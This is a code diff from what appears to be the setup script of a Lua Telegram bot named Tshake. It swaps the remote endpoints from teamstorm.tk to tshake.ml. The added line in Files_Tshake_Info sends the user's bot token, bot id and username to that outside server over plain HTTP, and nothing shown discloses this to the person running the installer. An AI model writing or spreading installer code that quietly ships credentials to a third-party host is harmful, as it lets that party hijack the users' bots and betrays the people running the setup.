@@ -38,7 +38,7 @@ if not database:get(Server_Tshake.."UserName_Tshake") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
+local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
+http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
 local RunTshake = io.open("Tshake", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
